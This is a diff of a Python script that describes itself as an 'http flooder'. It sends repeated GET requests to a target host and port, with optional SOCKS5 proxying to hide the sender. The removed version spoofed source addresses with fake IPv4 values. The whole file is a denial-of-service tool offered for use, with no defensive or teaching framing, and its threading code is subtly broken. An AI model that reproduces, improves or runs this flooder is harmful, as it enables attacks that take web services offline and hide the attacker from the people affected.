@@ -1,10 +1,11 @@
 from scapy.all import *
 import socket
-from faker import Faker
 import threading
 from random import *
 import sys
+import argparse
 import time
+import socks
 
 def load_agents(name):
         agentlist = []
@@ -13,58 +14,98 @@ def load_agents(name):
                     agentlist.append(i)
         return agentlist
 
-def error(message):
-        sys.exit(message)
-
-
-def sendsocket(src, dst):
-        port = 80
+def send_socket(args):
+        port = args.port
+        dst = socket.gethostbyname(args.host)
         try:
-                dst = socket.gethostbyname(dst)
-        except Exception:
-                error('Input a valid FQDN')
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((src, RandShort())) 
-        s.connect((dst, port))
-        s.sendto((f"GET / {dst} HTTP/1.1\r\nHost: {src} \r\n\r\n").encode('utf-8'), (dst, port))
-        s.close()
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((dst, port))
+                s.send((f"GET / HTTP/1.1\nHost: {dst}\n\n").encode('utf-8'))
+                s.close()
+        except Exception as s:
+                sys.exit(f'{s}, exiting gracefully')
 
 
-def flood(dst, packets, alist):
-        fake = Faker()
-        addrs = []
-        # packetlist = []
-        proctime = time.process_time()
-        print('generating fake ipv4 addresses...')
-        for i in range(0, packets+1):
-                s = fake.ipv4()
-                addrs.append(s)
 
-        proctime = time.process_time()-proctime
-        print(f'Done in {proctime} sec')
+def flood(args):
+        start = time.process_time()
+        
+        
 
+        if args.useproxy:
+                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxyhost, args.proxyport)
+                socket.socket = socks.socksocket
         print('sending packets')
-        for i in range(0, packets+1):
-                s = threading.Thread(target= sendsocket(addrs[i], dst))
+        
+        for i in range(0, args.packets+1):
+                tempS = time.process_time()
+                s = threading.Thread(target= send_socket(args))
                 s.start()
-                print(str(round((i/packets)*100, 2))+" %" +" done...", end='\r')
-        proctime = time.process_time()-proctime
-        print(f'Done in {proctime} sec')
-        print(f'Sent {packets} packets at a rate of {round(packets/proctime, 2)} packets/sec')       
+                tempE = time.process_time()
+                temptimer = tempE-tempS
+                if temptimer != 0:
+                        print(str(round((1/temptimer)*100, 2))+"packets/sec", end='\r')
+                
+        end = time.process_time()
+        timer = end-start
+        print(f'Done in {timer} sec')
+        if timer != 0:
+                print(f'Sent {args.packets} packets at a rate of {round(args.packets/(timer), 2)} packets/sec')       
+        else:
+                print(f'Sent {args.packets} instantly')
 
 
 
-# src = str(input('src: '))
+parser = argparse.ArgumentParser(description= 'http flooder programmed in python')
+parser.add_argument("host", help="target ip")
+parser.add_argument(
+        '-p',
+        help='host port, usually 80 for webservers',
+        default=80,
+        type=int,
+        dest='port'
+        )
+parser.add_argument(
+        '-r',
+        help='number of requests to send',
+        type=int,
+        dest='packets'
+        )
+
+        
+parser.add_argument(
+        "-x", "--useproxy",
+        dest="useproxy",
+        action="store_true",
+        help="Use a SOCKS5 proxy for connecting",
+        )
+
+parser.add_argument(
+        '-H','--proxy-host',
+        help='host address of SOCKS5 proxy',
+        dest = 'proxyhost',
+        type= str
+        )
+
+parser.add_argument(
+        '-P','--proxy-port',
+        help='host port of SOCKS5 proxy',
+        dest = 'proxyport',
+        type=int
+        )
+
+# parser.add_argument(
+#         '-ua', '--user-agent', '--user-agents',
+#         dest='randagent',
+#         action="store_true",
+#         help='use a random user agent',
+#         default="store_true"
+#         )
+
+args = parser.parse_args()
+
 agents = load_agents('agents.txt')
-if len(sys.argv) != 3:
-        print("USAGE:httpflood.py <FQDN> <number of packets>")
-        sys.exit(1)
 
-dst = sys.argv[1]
-packets = sys.argv[2]
-try:
-        packets = int(packets)
-except:
-        error('Invalid number of packets')
 
-flood(dst, packets, agents)
+
+flood(args)
